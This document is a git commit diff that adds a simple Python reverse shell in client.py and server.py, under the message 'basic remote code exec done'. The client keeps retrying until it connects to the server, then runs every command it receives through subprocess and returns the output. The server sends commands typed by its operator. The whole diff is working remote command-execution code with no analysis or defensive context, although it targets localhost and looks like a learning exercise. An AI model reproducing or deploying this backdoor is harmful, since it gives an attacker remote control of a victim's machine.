2cc58cea97794e83c03531f15ba9ab50a6f5474f
auro <000computricks@gmail.com>
2024-09-13 00:50:22 +0530

    basic remote code exec done

--- client.py
+++ client.py
@@ -1,11 +1,28 @@
 import socket
-
+import subprocess
 
 targetIp = "127.0.0.1"
-targetPort = 8888
-
+targetPort = 8887
 
 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-soc.setsockopt(socket.SOL_SOCKET, socket)
+print("Status : Connecting...")
 
-soc.connect((targetIp, targetPort))
+while True:
+    try:
+        soc.connect((targetIp, targetPort))
+        break
+    except ConnectionRefusedError:
+        pass
+
+print("Status : Connected to the server")
+
+while True:
+    receivedCommand = (soc.recv(1024)).decode()
+    if (receivedCommand == "exit"):
+        print("exit trigerred from server")
+        break
+    output = subprocess.getoutput(receivedCommand)
+    soc.send(output.encode())
+
+print("Status : Socket closed")
+soc.close()
--- server.py
+++ server.py
@@ -1,16 +1,29 @@
 import socket
 
-
 targetIp = "127.0.0.1"
-targetPort = 8888
-
+targetPort = 8887
 
 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-soc.setsockopt(socket.SOL_SOCKET, socket)
+soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
 soc.bind((targetIp, targetPort))
-print(f"Listening to : {targetIp}:{targetPort}")
+
 soc.listen(1)
+print(f"Listening to : {targetIp}:{targetPort}")
 
+client, address = soc.accept()
+print("Status : Connected with client")
 
+while True:
+    cmd = input("$ ")
+    client.send(cmd.encode())
+    print(cmd)
+    if (cmd == "exit"):
+        print("Exiting...")
+        break
+    output = (client.recv(1024)).decode()
+    print(output)
 
+print("Status : Socket closed")
+client.close()
+soc.close()
